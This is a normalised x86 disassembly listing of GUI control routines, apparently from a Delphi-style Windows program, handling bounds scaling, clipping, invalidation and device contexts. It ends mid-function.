push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_44e094
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_44e0b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44e1b3
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403518
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e1ba
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418e94
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403518
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403518
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418b9c
sub_44e1c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ecfc
mov edx edi
mov eax ebx
call sub_44e274
mov edx edi
mov eax ebx
call sub_44fb24
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e230
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_44e274
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44e2d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e2fc
mov edx eax
mov ecx esp
mov eax esi
call sub_417644
mov edx esp
mov eax ebx
call sub_44e740
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44e314
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e2b8
mov ecx esp
mov edx esi
call sub_417644
mov edx esp
mov eax ebx
call sub_44e740
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44e33c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e3bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e3c4
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
sub_44e3cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44e3f8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44e424
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4698a0
sub_44e454
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44fa80
sub_44e4d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_424d84
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_424da0
sub_44e69c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44e732
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_421fd4
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44e8b4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404524
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e739
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44e8e4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_44e740
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_44e788
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
test esi esi
je r-xdata
mov edx ebx
call sub_451d2c
mov edx ebx
mov eax esi
call sub_451c58
mov eax ebx
call sub_44df08
sub_44e7d4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403518
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44fa80
mov eax edi
mov si 0xffd0
call sub_403518
sub_44e86c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4627c0
mov edx ebx
mov eax esi
call sub_421b4c
sub_44e890
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44fa80
pop ebx
retn
sub_44e8b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44e828
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404208
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_44e838
sub_44e8e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e939
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404524
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e940
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax esi
call sub_4045d8
mov edx eax
mov eax ebx
call sub_44e890
sub_44e964
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_424ce0
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44fa80
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_424ce0
mov [ ebx + 0x84 ] eax
sub_44eaec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44eadc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_44ba84
mov eax esi
call sub_44ba84
jmp r-xdata
sub_44eb24
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_418d54
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418be8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_418d74
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ecfc
mov eax ebx
call sub_4657f0
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403518
sub_44eba4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44eb24
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44eb24
jmp r-xdata
sub_44ebc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44ec5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec65
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
sub_44ec70
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_418d54
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_418cf8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44e254
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ecfc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4553b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44e254
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4550b4
push eax
call InvalidateRect
push ebp
call sub_44ec70
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44ed98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4657c8
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44fa80
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403518
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44edfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4553b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4550b4
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44eed5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_452ec0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4550b4
push eax
call ReleaseDC
retn
sub_44ef74
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax edi
call sub_44fab4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44e3f8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e64
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44fa80
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_44cc04
sub_44f048
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44f084
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_44f0d0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_44f0fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44e858
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_44e844
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402abc
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402abc
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4550b4
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44f1e0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44f22c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403518
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403518
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44f2f0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44f33c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44f388
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
